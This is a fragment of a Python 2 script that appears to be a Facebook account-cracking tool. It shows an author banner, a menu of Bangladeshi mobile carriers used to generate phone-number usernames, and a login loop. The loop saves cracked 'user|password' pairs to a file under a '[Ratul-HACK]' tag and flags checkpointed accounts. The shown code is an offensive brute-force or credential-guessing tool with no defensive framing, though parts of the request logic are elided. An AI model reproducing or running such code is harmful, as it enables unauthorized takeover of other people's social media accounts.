...
logo = '\x1b[1;97m--------------------------------------------------\n      ---> Create to by -> Ratul Khan  <--- \n\x1b[1;97m-------------------------------------------------- \n\x1b[1;97m     Facebook -> facebook.com/Mr.R4tul \x1b[00m\n\x1b[1;97m--------------------------------------------------\n    ---> Github -> github.com/Ratul-120 <--- \n\x1b[1;97m--------------------------------------------------'
...
def menu():
    ...
    print '\x1b[1;91mAUTHOR  : Ratul'
    print '\x1b[1;91mFACEBOOK : Mouza Ali'
    print '\x1b[1;91mGITHUB  : github.com/Ratul-120'
    print ''
    print 50* '-'
    print '\x1b[1;94m--------------------------------------------------'
    print
    ...
    print
    print '\x1b[1;92m[1]  ROBI (Ratul)'
    print '\x1b[1;92m[2]  AIRTEL(Ratul)'
    print '\x1b[1;92m[3]  BANGLALINK(OLD)'
    print '\x1b[1;92m[4]  BANGLALINK(NEW)'
    print '\x1b[1;92m[5]  GRAMEEN(Ratul)'
    print '\x1b[1;92m[6]  TELETALK(Ratul)'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Ratul-HACK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[Ratul-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[Login 7 Days]\x1b[0m \n'
